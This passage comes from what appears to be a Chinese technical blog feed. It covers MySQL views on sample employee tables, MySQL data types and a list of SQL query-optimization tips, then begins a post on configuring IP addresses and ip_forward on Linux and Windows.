class="string">&#x27;陆明&#x27;</span>,<span class="string">&#x27;男&#x27;</span>,<span class="number">26</span>,<span class="string">&#x27;业务销售部&#x27;</span>,<span class="string">&#x27;10000&#x27;</span>,<span class="string">&#x27;山西&#x27;</span>,<span class="string">&#x27;否&#x27;</span>,<span class="string">&#x27;篮球&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> employee(ID, NAME, SEX, AGE,DEPARTMENT, SALARY, HOME, MARRY, HOBBY) <span class="keyword">VALUES</span>(<span class="keyword">NULL</span>,<span class="string">&#x27;韩路&#x27;</span>,<span class="string">&#x27;男&#x27;</span>,<span class="number">26</span>,<span class="string">&#x27;业务销售部&#x27;</span>,<span class="string">&#x27;15000&#x27;</span>,<span class="string">&#x27;江苏&#x27;</span>,<span class="string">&#x27;否&#x27;</span>,<span class="string">&#x27;足球&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>具体的表内容如下：</p>
<img data-src="/2023/11/06/SQL%E5%90%84%E7%A7%8D%E6%9F%A5%E8%AF%A2%E7%94%A8%E6%B3%95%E5%8F%8A%E4%BC%98%E5%8C%96/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JhaWR1XzE1OTUyMTAz,size_16,color_FFFFFF,t_70.png" class title="img">

<p>员工信息表和数据：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> employee_detail(</span><br><span class="line">	ID <span class="type">INT</span> <span class="keyword">PRIMARY</span> KEY,</span><br><span class="line">	POS <span class="type">CHAR</span>(<span class="number">10</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span>,</span><br><span class="line">	EXPERENCE <span class="type">CHAR</span>(<span class="number">10</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span>,</span><br><span class="line">	<span class="keyword">CONSTRAINT</span> `FK_ID` <span class="keyword">FOREIGN</span> KEY(ID) <span class="keyword">REFERENCES</span> employee(ID)</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> employee_detail(ID,POS,EXPERENCE) <span class="keyword">VALUES</span>(<span class="number">1</span>,<span class="string">&#x27;人事管理&#x27;</span>,<span class="string">&#x27;工作二年&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> employee_detail(ID,POS,EXPERENCE) <span class="keyword">VALUES</span>(<span class="number">2</span>,<span class="string">&#x27;人事招聘&#x27;</span>,<span class="string">&#x27;工作二年&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> employee_detail(ID,POS,EXPERENCE) <span class="keyword">VALUES</span>(<span class="number">3</span>,<span class="string">&#x27;初级工程师&#x27;</span>,<span class="string">&#x27;工作一年&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> employee_detail(ID,POS,EXPERENCE) <span class="keyword">VALUES</span>(<span class="number">4</span>,<span class="string">&#x27;中级工程师&#x27;</span>,<span class="string">&#x27;工作二年&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> employee_detail(ID,POS,EXPERENCE) <span class="keyword">VALUES</span>(<span class="number">5</span>,<span class="string">&#x27;高级工程师&#x27;</span>,<span class="string">&#x27;工作三年&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> employee_detail(ID,POS,EXPERENCE) <span class="keyword">VALUES</span>(<span class="number">6</span>,<span class="string">&#x27;销售代表&#x27;</span>,<span class="string">&#x27;工作二年&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> employee_detail(ID,POS,EXPERENCE) <span class="keyword">VALUES</span>(<span class="number">7</span>,<span class="string">&#x27;销售经理&#x27;</span>,<span class="string">&#x27;工作一年&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> employee_detail(ID,POS,EXPERENCE) <span class="keyword">VALUES</span>(<span class="number">8</span>,<span class="string">&#x27;销售总监&#x27;</span>,<span class="string">&#x27;工作一年&#x27;</span>);</span><br></pre></td></tr></table></figure>


<p>具体的表内容如下：</p>
<img data-src="/2023/11/06/SQL%E5%90%84%E7%A7%8D%E6%9F%A5%E8%AF%A2%E7%94%A8%E6%B3%95%E5%8F%8A%E4%BC%98%E5%8C%96/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JhaWR1XzE1OTUyMTAz,size_16,color_FFFFFF,t_70-16994923065872.png" class title="img">



<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">#单表上创建视图:</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">VIEW</span> V_VIEW1(ID, NAME, SEX, AGE,DEPARTMENT) <span class="keyword">AS</span> <span class="keyword">SELECT</span> ID, NAME, SEX, AGE,DEPARTMENT <span class="keyword">FROM</span> employee;</span><br><span class="line"></span><br><span class="line">#显示结果</span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> V_VIEW1;</span><br><span class="line"></span><br><span class="line">#多表上创建视图:</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">VIEW</span> V_VIEW2(ID, NAME, SEX, AGE,DEPARTMENT,POS,EXPERENCE) <span class="keyword">AS</span> <span class="keyword">SELECT</span> a.ID, a.NAME, a.SEX, a.AGE,a.DEPARTMENT,b.POS,b.EXPERENCE <span class="keyword">FROM</span> employee a,employee_detail b <span class="keyword">WHERE</span> a.ID<span class="operator">=</span>b.ID;</span><br><span class="line"></span><br><span class="line">#显示结果</span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> V_VIEW2;</span><br><span class="line"></span><br><span class="line">#修改视图中的数据，会影响原有表数据变化，例如：</span><br><span class="line"><span class="keyword">UPDATE</span> V_VIEW2 <span class="keyword">SET</span> POS<span class="operator">=</span><span class="string">&#x27;高级工程师&#x27;</span> <span class="keyword">WHERE</span> NAME<span class="operator">=</span><span class="string">&#x27;李楠&#x27;</span>;</span><br><span class="line"></span><br><span class="line">#修改原始表中的数据，会影响视图的变化，例如：</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> employee(ID, NAME, SEX, AGE,DEPARTMENT, SALARY, HOME, MARRY, HOBBY) <span class="keyword">VALUES</span>(<span class="keyword">NULL</span>,<span class="string">&#x27;韩寒&#x27;</span>,<span class="string">&#x27;男&#x27;</span>,<span class="number">24</span>,<span class="string">&#x27;产品研发部&#x27;</span>,<span class="string">&#x27;8000&#x27;</span>,<span class="string">&#x27;上海&#x27;</span>,<span class="string">&#x27;否&#x27;</span>,<span class="string">&#x27;音乐&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> employee_detail(ID,POS,EXPERENCE) <span class="keyword">VALUES</span>(<span class="number">9</span>,<span class="string">&#x27;初级工程师&#x27;</span>,<span class="string">&#x27;工作一年&#x27;</span>);</span><br><span class="line"></span><br><span class="line">#显示结果</span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> V_VIEW2;</span><br></pre></td></tr></table></figure>

<h2 id="MySQL数据类型"><a href="#MySQL数据类型" class="headerlink" title="MySQL数据类型"></a>MySQL数据类型</h2><p>MySQL 支持多种类型，大致可以分为三类：数值、日期&#x2F;时间和字符串(字符)类型。</p>
<h3 id="数值类型"><a href="#数值类型" class="headerlink" title="数值类型"></a>数值类型</h3><p>MySQL 支持所有标准 SQL 数值数据类型。</p>
<p>这些类型包括严格数值数据类型(INTEGER、SMALLINT、DECIMAL 和 NUMERIC)，以及近似数值数据类型(FLOAT、REAL 和 DOUBLE PRECISION)。</p>
<p>关键字INT是INTEGER的同义词，关键字DEC是DECIMAL的同义词。</p>
<p>BIT数据类型保存位字段值，并且支持 MyISAM、MEMORY、InnoDB 和 BDB表。</p>
<p>作为 SQL 标准的扩展，MySQL 也支持整数类型 TINYINT、MEDIUMINT 和 BIGINT。下面的表显示了需要的每个整数类型的存储和范围。</p>
<table>
<thead>
<tr>
<th align="left">类型</th>
<th align="left">大小</th>
<th align="left">范围（有符号）</th>
<th align="left">范围（无符号）</th>
<th align="left">用途</th>
</tr>
</thead>
<tbody><tr>
<td align="left">TINYINT</td>
<td align="left">1 Bytes</td>
<td align="left">(-128，127)</td>
<td align="left">(0，255)</td>
<td align="left">小整数值</td>
</tr>
<tr>
<td align="left">SMALLINT</td>
<td align="left">2 Bytes</td>
<td align="left">(-32 768，32 767)</td>
<td align="left">(0，65 535)</td>
<td align="left">大整数值</td>
</tr>
<tr>
<td align="left">MEDIUMINT</td>
<td align="left">3 Bytes</td>
<td align="left">(-8 388 608，8 388 607)</td>
<td align="left">(0，16 777 215)</td>
<td align="left">大整数值</td>
</tr>
<tr>
<td align="left">INT或INTEGER</td>
<td align="left">4 Bytes</td>
<td align="left">(-2 147 483 648，2 147 483 647)</td>
<td align="left">(0，4 294 967 295)</td>
<td align="left">大整数值</td>
</tr>
<tr>
<td align="left">BIGINT</td>
<td align="left">8 Bytes</td>
<td align="left">(-9,223,372,036,854,775,808，9 223 372 036 854 775 807)</td>
<td align="left">(0，18 446 744 073 709 551 615)</td>
<td align="left">极大整数值</td>
</tr>
<tr>
<td align="left">FLOAT</td>
<td align="left">4 Bytes</td>
<td align="left">(-3.402 823 466 E+38，-1.175 494 351 E-38)，0，(1.175 494 351 E-38，3.402 823 466 351 E+38)</td>
<td align="left">0，(1.175 494 351 E-38，3.402 823 466 E+38)</td>
<td align="left">单精度 浮点数值</td>
</tr>
<tr>
<td align="left">DOUBLE</td>
<td align="left">8 Bytes</td>
<td align="left">(-1.797 693 134 862 315 7 E+308，-2.225 073 858 507 201 4 E-308)，0，(2.225 073 858 507 201 4 E-308，1.797 693 134 862 315 7 E+308)</td>
<td align="left">0，(2.225 073 858 507 201 4 E-308，1.797 693 134 862 315 7 E+308)</td>
<td align="left">双精度 浮点数值</td>
</tr>
<tr>
<td align="left">DECIMAL</td>
<td align="left">对DECIMAL(M,D) ，如果M&gt;D，为M+2否则为D+2</td>
<td align="left">依赖于M和D的值</td>
<td align="left">依赖于M和D的值</td>
<td align="left">小数值</td>
</tr>
</tbody></table>
<h3 id="日期和时间类型"><a href="#日期和时间类型" class="headerlink" title="日期和时间类型"></a>日期和时间类型</h3><p>表示时间值的日期和时间类型为DATETIME、DATE、TIMESTAMP、TIME和YEAR。</p>
<p>每个时间类型有一个有效值范围和一个”零”值，当指定不合法的MySQL不能表示的值时使用”零”值。</p>
<p>TIMESTAMP类型有专有的自动更新特性，将在后面描述。</p>
<table>
<thead>
<tr>
<th align="left">类型</th>
<th align="left">大小 ( bytes)</th>
<th align="left">范围</th>
<th align="left">格式</th>
<th align="left">用途</th>
</tr>
</thead>
<tbody><tr>
<td align="left">DATE</td>
<td align="left">3</td>
<td align="left">1000-01-01&#x2F;9999-12-31</td>
<td align="left">YYYY-MM-DD</td>
<td align="left">日期值</td>
</tr>
<tr>
<td align="left">TIME</td>
<td align="left">3</td>
<td align="left">‘-838:59:59’&#x2F;‘838:59:59’</td>
<td align="left">HH:MM:SS</td>
<td align="left">时间值或持续时间</td>
</tr>
<tr>
<td align="left">YEAR</td>
<td align="left">1</td>
<td align="left">1901&#x2F;2155</td>
<td align="left">YYYY</td>
<td align="left">年份值</td>
</tr>
<tr>
<td align="left">DATETIME</td>
<td align="left">8</td>
<td align="left">‘1000-01-01 00:00:00’ 到 ‘9999-12-31 23:59:59’</td>
<td align="left">YYYY-MM-DD hh:mm:ss</td>
<td align="left">混合日期和时间值</td>
</tr>
<tr>
<td align="left">TIMESTAMP</td>
<td align="left">4</td>
<td align="left">‘1970-01-01 00:00:01’ UTC 到 ‘2038-01-19 03:14:07’ UTC结束时间是第 <strong>2147483647</strong> 秒，北京时间 <strong>2038-1-19 11:14:07</strong>，格林尼治时间 2038年1月19日 凌晨 03:14:07</td>
<td align="left">YYYY-MM-DD hh:mm:ss</td>
<td align="left">混合日期和时间值，时间戳</td>
</tr>
</tbody></table>
<h3 id="字符串类型"><a href="#字符串类型" class="headerlink" title="字符串类型"></a>字符串类型</h3><p>字符串类型指CHAR、VARCHAR、BINARY、VARBINARY、BLOB、TEXT、ENUM和SET。该节描述了这些类型如何工作以及如何在查询中使用这些类型。</p>
<table>
<thead>
<tr>
<th align="left">类型</th>
<th align="left">大小</th>
<th align="left">用途</th>
</tr>
</thead>
<tbody><tr>
<td align="left">CHAR</td>
<td align="left">0-255 bytes</td>
<td align="left">定长字符串</td>
</tr>
<tr>
<td align="left">VARCHAR</td>
<td align="left">0-65535 bytes</td>
<td align="left">变长字符串</td>
</tr>
<tr>
<td align="left">TINYBLOB</td>
<td align="left">0-255 bytes</td>
<td align="left">不超过 255 个字符的二进制字符串</td>
</tr>
<tr>
<td align="left">TINYTEXT</td>
<td align="left">0-255 bytes</td>
<td align="left">短文本字符串</td>
</tr>
<tr>
<td align="left">BLOB</td>
<td align="left">0-65 535 bytes</td>
<td align="left">二进制形式的长文本数据</td>
</tr>
<tr>
<td align="left">TEXT</td>
<td align="left">0-65 535 bytes</td>
<td align="left">长文本数据</td>
</tr>
<tr>
<td align="left">MEDIUMBLOB</td>
<td align="left">0-16 777 215 bytes</td>
<td align="left">二进制形式的中等长度文本数据</td>
</tr>
<tr>
<td align="left">MEDIUMTEXT</td>
<td align="left">0-16 777 215 bytes</td>
<td align="left">中等长度文本数据</td>
</tr>
<tr>
<td align="left">LONGBLOB</td>
<td align="left">0-4 294 967 295 bytes</td>
<td align="left">二进制形式的极大文本数据</td>
</tr>
<tr>
<td align="left">LONGTEXT</td>
<td align="left">0-4 294 967 295 bytes</td>
<td align="left">极大文本数据</td>
</tr>
</tbody></table>
<p><strong>注意</strong>：char(n) 和 varchar(n) 中括号中 n 代表字符的个数，并不代表字节个数，比如 CHAR(30) 就可以存储 30 个字符。</p>
<p>CHAR 和 VARCHAR 类型类似，但它们保存和检索的方式不同。它们的最大长度和是否尾部空格被保留等方面也不同。在存储或检索过程中不进行大小写转换。</p>
<p>BINARY 和 VARBINARY 类似于 CHAR 和 VARCHAR，不同的是它们包含二进制字符串而不要非二进制字符串。也就是说，它们包含字节字符串而不是字符字符串。这说明它们没有字符集，并且排序和比较基于列值字节的数值值。</p>
<p>BLOB 是一个二进制大对象，可以容纳可变数量的数据。有 4 种 BLOB 类型：TINYBLOB、BLOB、MEDIUMBLOB 和 LONGBLOB。它们区别在于可容纳存储范围不同。</p>
<p>有 4 种 TEXT 类型：TINYTEXT、TEXT、MEDIUMTEXT 和 LONGTEXT。对应的这 4 种 BLOB 类型，可存储的最大长度不同，可根据实际情况选择。</p>
<h2 id="MySQL数据库优化"><a href="#MySQL数据库优化" class="headerlink" title="MySQL数据库优化"></a>MySQL数据库优化</h2><blockquote>
<p>以下内容全来自<a href="https://blog.csdn.net/zhangbijun1230/article/details/81608252">MySQL数据库优化的八种方式(经典必看)-CSDN博客</a></p>
</blockquote>
<p>1.对查询进行优化，要尽量避免全表扫描，首先应考虑在 where 及 order by 涉及的列上建立索引。</p>
<p>2.应尽量避免在 where 子句中对字段进行 null 值判断，否则将导致引擎放弃使用索引而进行全表扫描，如：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> id <span class="keyword">from</span> t <span class="keyword">where</span> num <span class="keyword">is</span> <span class="keyword">null</span></span><br></pre></td></tr></table></figure>

<p>最好不要给数据库留NULL，尽可能的使用 NOT NULL填充数据库.</p>
<p>备注、描述、评论之类的可以设置为 NULL，其他的，最好不要使用NULL。</p>
<p>不要以为 NULL 不需要空间，比如：char(100) 型，在字段建立时，空间就固定了， 不管是否插入值（NULL也包含在内），都是占用 100个字符的空间的，如果是varchar这样的变长字段， null 不占用空间。</p>
<p>可以在num上设置默认值0，确保表中num列没有null值，然后这样查询：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> id <span class="keyword">from</span> t <span class="keyword">where</span> num <span class="operator">=</span> <span class="number">0</span></span><br></pre></td></tr></table></figure>

<p>3.应尽量避免在 where 子句中使用 !&#x3D; 或 &lt;&gt; 操作符，否则将引擎放弃使用索引而进行全表扫描。</p>
<p>4.应尽量避免在 where 子句中使用 or 来连接条件，如果一个字段有索引，一个字段没有索引，将导致引擎放弃使用索引而进行全表扫描，如：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> id <span class="keyword">from</span> t <span class="keyword">where</span> num<span class="operator">=</span><span class="number">10</span> <span class="keyword">or</span> Name <span class="operator">=</span> <span class="string">&#x27;admin&#x27;</span></span><br></pre></td></tr></table></figure>

<p>可以这样查询：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> id <span class="keyword">from</span> t <span class="keyword">where</span> num <span class="operator">=</span> <span class="number">10</span></span><br><span class="line"><span class="keyword">union</span> <span class="keyword">all</span></span><br><span class="line"><span class="keyword">select</span> id <span class="keyword">from</span> t <span class="keyword">where</span> Name <span class="operator">=</span> <span class="string">&#x27;admin&#x27;</span></span><br></pre></td></tr></table></figure>

<p>5.in 和 not in 也要慎用，否则会导致全表扫描，如：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> id <span class="keyword">from</span> t <span class="keyword">where</span> num <span class="keyword">in</span>(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>)</span><br></pre></td></tr></table></figure>

<p>对于连续的数值，能用 between 就不要用 in 了：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> id <span class="keyword">from</span> t <span class="keyword">where</span> num <span class="keyword">between</span> <span class="number">1</span> <span class="keyword">and</span> <span class="number">3</span></span><br></pre></td></tr></table></figure>

<p>很多时候用 exists 代替 in 是一个好的选择：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> num <span class="keyword">from</span> a <span class="keyword">where</span> num <span class="keyword">in</span>(<span class="keyword">select</span> num <span class="keyword">from</span> b)</span><br></pre></td></tr></table></figure>

<p>用下面的语句替换：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> num <span class="keyword">from</span> a <span class="keyword">where</span> <span class="keyword">exists</span>(<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> b <span class="keyword">where</span> num<span class="operator">=</span>a.num)</span><br></pre></td></tr></table></figure>

<p>6.下面的查询也将导致全表扫描：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> id <span class="keyword">from</span> t <span class="keyword">where</span> name <span class="keyword">like</span> <span class="string">&#x27;%abc%&#x27;</span></span><br></pre></td></tr></table></figure>

<p>若要提高效率，可以考虑全文检索。</p>
<p>7.如果在 where 子句中使用参数，也会导致全表扫描。因为SQL只有在运行时才会解析局部变量，但优化程序不能将访问计划的选择推迟到运行时；它必须在编译时进行选择。然而，如果在编译时建立访问计划，变量的值还是未知的，因而无法作为索引选择的输入项。如下面语句将进行全表扫描：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> id <span class="keyword">from</span> t <span class="keyword">where</span> num <span class="operator">=</span> <span class="variable">@num</span></span><br></pre></td></tr></table></figure>

<p>可以改为强制查询使用索引：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> id <span class="keyword">from</span> t <span class="keyword">with</span>(index(索引名)) <span class="keyword">where</span> num <span class="operator">=</span> <span class="variable">@num</span></span><br></pre></td></tr></table></figure>

<p>应尽量避免在 where 子句中对字段进行表达式操作，这将导致引擎放弃使用索引而进行全表扫描。如：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> id <span class="keyword">from</span> t <span class="keyword">where</span> num<span class="operator">/</span><span class="number">2</span> <span class="operator">=</span> <span class="number">100</span></span><br></pre></td></tr></table></figure>

<p>应改为:</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> id <span class="keyword">from</span> t <span class="keyword">where</span> num <span class="operator">=</span> <span class="number">100</span><span class="operator">*</span><span class="number">2</span></span><br></pre></td></tr></table></figure>


<p>9.应尽量避免在where子句中对字段进行函数操作，这将导致引擎放弃使用索引而进行全表扫描。如：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">#<span class="comment">--name以abc开头的id</span></span><br><span class="line"><span class="keyword">select</span> id <span class="keyword">from</span> t <span class="keyword">where</span> <span class="built_in">substring</span>(name,<span class="number">1</span>,<span class="number">3</span>) <span class="operator">=</span> <span class="string">&#x27;abc&#x27;</span></span><br><span class="line"><span class="keyword">select</span> id <span class="keyword">from</span> t <span class="keyword">where</span> datediff(<span class="keyword">day</span>,createdate,<span class="string">&#x27;2005-11-30&#x27;</span>) <span class="operator">=</span> <span class="number">0</span></span><br></pre></td></tr></table></figure>

<p>应改为:</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> id <span class="keyword">from</span> t <span class="keyword">where</span> name <span class="keyword">like</span> <span class="string">&#x27;abc%&#x27;</span></span><br><span class="line"><span class="keyword">select</span> id <span class="keyword">from</span> t <span class="keyword">where</span> createdate <span class="operator">&gt;=</span> <span class="string">&#x27;2005-11-30&#x27;</span> <span class="keyword">and</span> createdate <span class="operator">&lt;</span> <span class="string">&#x27;2005-12-1&#x27;</span></span><br></pre></td></tr></table></figure>

<p>10.不要在 where 子句中的“&#x3D;”左边进行函数、算术运算或其他表达式运算，否则系统将可能无法正确使用索引。</p>
<p>11.在使用索引字段作为条件时，如果该索引是复合索引，那么必须使用到该索引中的第一个字段作为条件时才能保证系统使用该索引，否则该索引将不会被使用，并且应尽可能的让字段顺序与索引顺序相一致。</p>
<p>12.不要写一些没有意义的查询，如需要生成一个空表结构：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> col1,col2 <span class="keyword">into</span> #t <span class="keyword">from</span> t <span class="keyword">where</span> <span class="number">1</span><span class="operator">=</span><span class="number">0</span></span><br></pre></td></tr></table></figure>

<p>这类代码不会返回任何结果集，但是会消耗系统资源的，应改成这样：<br>create table #t(…)</p>
<p>13.Update 语句，如果只更改1、2个字段，不要Update全部字段，否则频繁调用会引起明显的性能消耗，同时带来大量日志。</p>
<p>14.对于多张大数据量（这里几百条就算大了）的表JOIN，要先分页再JOIN，否则逻辑读会很高，性能很差。</p>
<p>15.select count(*) from table；这样不带任何条件的count会引起全表扫描，并且没有任何业务意义，是一定要杜绝的。</p>
<p>16.索引并不是越多越好，索引固然可以提高相应的 select 的效率，但同时也降低了 insert 及 update 的效率，因为 insert 或 update 时有可能会重建索引，所以怎样建索引需要慎重考虑，视具体情况而定。一个表的索引数最好不要超过6个，若太多则应考虑一些不常使用到的列上建的索引是否有必要。</p>
<p>17.应尽可能的避免更新 clustered 索引数据列，因为 clustered 索引数据列的顺序就是表记录的物理存储顺序，一旦该列值改变将导致整个表记录的顺序的调整，会耗费相当大的资源。若应用系统需要频繁更新 clustered 索引数据列，那么需要考虑是否应将该索引建为 clustered 索引。</p>
<p>18.尽量使用数字型字段，若只含数值信息的字段尽量不要设计为字符型，这会降低查询和连接的性能，并会增加存储开销。这是因为引擎在处理查询和连接时会逐个比较字符串中每一个字符，而对于数字型而言只需要比较一次就够了。</p>
<p>19.尽可能的使用 varchar&#x2F;nvarchar 代替 char&#x2F;nchar ，因为首先变长字段存储空间小，可以节省存储空间，其次对于查询来说，在一个相对较小的字段内搜索效率显然要高些。</p>
<p>20.任何地方都不要使用 select * from t ，用具体的字段列表代替“*”，不要返回用不到的任何字段。</p>
<p>21.尽量使用表变量来代替临时表。如果表变量包含大量数据，请注意索引非常有限（只有主键索引）。</p>
<p>22.避免频繁创建和删除临时表，以减少系统表资源的消耗。临时表并不是不可使用，适当地使用它们可以使某些例程更有效，例如，当需要重复引用大型表或常用表中的某个数据集时。但是，对于一次性事件， 最好使用导出表。</p>
<p>23.在新建临时表时，如果一次性插入数据量很大，那么可以使用 select into 代替 create table，避免造成大量 log ，以提高速度；如果数据量不大，为了缓和系统表的资源，应先create table，然后insert。</p>
<p>24.如果使用到了临时表，在存储过程的最后务必将所有的临时表显式删除，先 truncate table ，然后 drop table ，这样可以避免系统表的较长时间锁定。</p>
<p>25.尽量避免使用游标，因为游标的效率较差，如果游标操作的数据超过1万行，那么就应该考虑改写。</p>
<p>26.使用基于游标的方法或临时表方法之前，应先寻找基于集的解决方案来解决问题，基于集的方法通常更有效。</p>
<p>27.与临时表一样，游标并不是不可使用。对小型数据集使用 FAST_FORWARD 游标通常要优于其他逐行处理方法，尤其是在必须引用几个表才能获得所需的数据时。在结果集中包括“合计”的例程通常要比使用游标执行的速度快。如果开发时 间允许，基于游标的方法和基于集的方法都可以尝试一下，看哪一种方法的效果更好。</p>
<p>28.在所有的存储过程和触发器的开始处设置 SET NOCOUNT ON ，在结束时设置 SET NOCOUNT OFF 。无需在执行存储过程和触发器的每个语句后向客户端发送 DONE_IN_PROC 消息。</p>
<p>29.尽量避免大事务操作，提高系统并发能力。</p>
<p>30.尽量避免向客户端返回大数据量，若数据量过大，应该考虑相应需求是否合理。</p>
<p>实际案例分析：拆分大的 DELETE 或INSERT 语句，批量提交SQL语句<br>　　如果你需要在一个在线的网站上去执行一个大的 DELETE 或 INSERT 查询，你需要非常小心，要避免你的操作让你的整个网站停止相应。因为这两个操作是会锁表的，表一锁住了，别的操作都进不来了。<br>　　Apache 会有很多的子进程或线程。所以，其工作起来相当有效率，而我们的服务器也不希望有太多的子进程，线程和数据库链接，这是极大的占服务器资源的事情，尤其是内存。<br>　　如果你把你的表锁上一段时间，比如30秒钟，那么对于一个有很高访问量的站点来说，这30秒所积累的访问进程&#x2F;线程，数据库链接，打开的文件数，可能不仅仅会让你的WEB服务崩溃，还可能会让你的整台服务器马上挂了。<br>　　所以，如果你有一个大的处理，你一定把其拆分，使用 LIMIT oracle(rownum),sqlserver(top)条件是一个好的方法。下面是一个mysql示例：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line"></span><br><span class="line"> 　　<span class="comment">//每次只做1000条</span></span><br><span class="line"></span><br><span class="line">　　 mysql_query(<span class="string">&quot;delete from logs where log_date &lt;= &#x27;2012-11-01&#x27; limit 1000&quot;</span>);</span><br><span class="line"></span><br><span class="line"> 　　<span class="keyword">if</span>(mysql_affected_rows() == <span class="number">0</span>)&#123;</span><br><span class="line"></span><br><span class="line">　　 　　<span class="comment">//删除完成，退出！</span></span><br><span class="line">　　 　　<span class="keyword">break</span>；</span><br><span class="line">　　&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//每次暂停一段时间，释放表让其他进程/线程访问。</span></span><br><span class="line">usleep(<span class="number">50000</span>)</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>学习计划</tag>
        <tag>SQL</tag>
      </tags>
  </entry>
  <entry>
    <title>网络及协议</title>
    <url>/2023/10/11/%E7%BD%91%E7%BB%9C%E5%8F%8A%E5%8D%8F%E8%AE%AE/</url>
    <content><![CDATA[<h3 id="linux-Windows-IP配置"><a href="#linux-Windows-IP配置" class="headerlink" title="linux&#x2F;Windows IP配置"></a>linux&#x2F;Windows IP配置</h3><p><a href="https://blog.csdn.net/weixin_35909607/article/details/116824527#:~:text=1">linux和windows改ip地址,Linux和Windows下IP地址设置_羊鱼鸡的博客-CSDN博客</a></p>
<p><strong>省流版</strong>：</p>
<h4 id="windows-IP配置"><a href="#windows-IP配置" class="headerlink" title="windows IP配置"></a>windows IP配置</h4><img data-src="/2023/10/11/%E7%BD%91%E7%BB%9C%E5%8F%8A%E5%8D%8F%E8%AE%AE/image-20231011104332748.png" class title="image-20231011104332748">

<h4 id="linux-IP配置"><a href="#linux-IP配置" class="headerlink" title="linux IP配置"></a>linux IP配置</h4><span id="more"></span>

<ol>
<li>在终端中输入：vi &#x2F;etc&#x2F;sysconfig&#x2F;network-scripts&#x2F;ifcfg-eth0</li>
</ol>
<img data-src="/2023/10/11/%E7%BD%91%E7%BB%9C%E5%8F%8A%E5%8D%8F%E8%AE%AE/3d0439ec570ffe75fc081fb584753902.png" class title="3d0439ec570ffe75fc081fb584753902.png">

<ol start="2">
<li>开始编辑，填写ip地址、子网掩码、网关、DNS等。其中“红框内的信息”是必须得有的。</li>
</ol>
<img data-src="/2023/10/11/%E7%BD%91%E7%BB%9C%E5%8F%8A%E5%8D%8F%E8%AE%AE/9c6d7d2aaf25fe01c0a3262103415408.png" class title="9c6d7d2aaf25fe01c0a3262103415408.png">

<ol start="3">
<li><p>编辑完后，保存退出(:w保存， ：q退出)。</p>
</li>
<li><p>重启网络服务。service network restart或&#x2F;etc&#x2F;init.d&#x2F;network restart。即可。</p>
</li>
</ol>
<h3 id="linux-Windows路由配置"><a href="#linux-Windows路由配置" class="headerlink" title="linux&#x2F;Windows路由配置"></a>linux&#x2F;Windows路由配置</h3><h4 id="ip-forward的作用"><a href="#ip-forward的作用" class="headerlink" title="ip_forward的作用"></a>ip_forward的作用</h4><p>在Linux系统中，ip_forward用于控制IP报文的转发。当ip_forward的值为1时，Linux内核会允许IP报文转发，这通常用于实现路由和负载均衡等功能。反之，当ip_forward的值为0时，Linux内核会禁止IP报文转发，这通常用于保证网络安全。</p>
